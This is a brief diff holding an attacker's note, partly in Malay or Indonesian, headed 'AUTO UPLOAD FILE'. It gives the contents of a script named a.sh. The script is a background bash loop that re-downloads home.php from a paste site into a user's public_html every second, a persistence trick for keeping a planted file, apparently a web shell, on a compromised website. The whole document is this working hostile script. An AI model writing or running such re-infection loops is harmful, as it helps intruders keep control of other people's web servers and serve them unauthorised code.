@@ -1,0 +1,6 @@
+bash -c 'while true; do if [ ! -f "  /home/ppgftik/public_html/home.php " ]; then curl -o /home/ppgftik/public_html/home.php https://paste.phyo186.cfd/mK4nV-djpwX/raw; fi; sleep 1; done' &
+
+
+AUTO UPLOAD FILE
+a.sh (nama file) 
+(isi dalaman) (bash -c 'while true; do if [ ! -f "  /home/ppgftik/public_html/home.php " ]; then curl -o /home/ppgftik/public_html/home.php https://paste.phyo186.cfd/mK4nV-djpwX/raw; fi; sleep 1; done' &)
